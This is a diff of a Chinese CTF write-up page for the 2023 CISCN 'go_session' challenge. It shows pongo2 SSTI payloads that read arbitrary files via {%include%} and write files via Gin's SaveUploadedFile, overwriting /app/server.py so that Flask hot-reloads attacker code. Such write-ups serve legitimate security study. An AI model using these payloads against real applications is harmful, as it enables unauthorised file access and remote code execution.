@@ -86,9 +86,14 @@
 <p>如图，当flask文件的内容被更改后，flask会自动更新，也就是热加载</p>
 <p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-web-go_session-2.png"></p>
 <p>所以我们可以利用ssti实现任意文件读写，然后覆盖server.py，实现自己的恶意内容</p>
-<figure class="highlight golang"><table><tr><td class="code"><pre><code class="hljs golang"><span class="hljs-comment">//读文件</span><br>&#123;%include c.Request.Referer()%&#125;<br>&#123;%include c.Request.Host()%&#125;<br><br><span class="hljs-comment">//写文件</span><br>&#123;&#123;c.SaveUploadedFile(c.FormFile(c.Request.Host),c.Request.Referer())&#125;&#125;<br>&#123;%set form=c.Query(c.HandlerName|first)%&#125;&#123;&#123;c.SaveUploadedFile(c.FormFile(form),c.Request.Referer())&#125;&#125;&amp;m=file<br></code></pre></td></tr></table></figure>
+<p>查阅<a href="https://pkg.go.dev/github.com/flosch/pongo2#section-readme">官方手册</a>可知pongo2与Django 1.7有兼容的语法和功能集</p>
+<p>Django中的include在pongo2中也能使用<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-web-go_session-6.png"></p>
+<p>可以使⽤Gin Context里的FormFile来读取表单⽂件，SaveUploadFile 来实现⽂件上传，注意需要用GET传参</p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-web-go_session-8.png"></p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-web-go_session-7.png"></p>
+<figure class="highlight golang"><table><tr><td class="code"><pre><code class="hljs golang"><span class="hljs-comment">//读文件</span><br>&#123;%include c.Request.Referer()%&#125;<br>&#123;%include c.Request.Host()%&#125;<br><br><span class="hljs-comment">//写文件</span><br><span class="hljs-comment">//这三个payload其实大同小异，只是后两个使用了过滤器（c.HandlerName的值为 main/route.Admin ）</span><br>&#123;&#123;c.SaveUploadedFile(c.FormFile(c.Request.Host),c.Request.Referer())&#125;&#125;<br>&#123;%set form=c.Query(c.HandlerName|first)%&#125;&#123;&#123;c.SaveUploadedFile(c.FormFile(form),c.Request.Referer())&#125;&#125;&amp;m=file<br>&#123;%set form=c.Query(c.HandlerName|first)%&#125;&#123;%set path=c.Query(c.HandlerName|last)%&#125;&#123;%set file=c.FormFile(form)%&#125;&#123;&#123;c.SaveUploadedFile(file,path)&#125;&#125;&amp;m=file&amp;n=/app/server.py<br></code></pre></td></tr></table></figure>
 
-<p>可以使⽤Gin Context里的FormFile来读取表单⽂件，SaveUploadFile 来实现⽂件上传</p>
+
 <p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-web-go_session-4.png"></p>
 <p>覆盖后就可以执行我们自定义的内容了</p>
 <p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-web-go_session-5.png"></p>
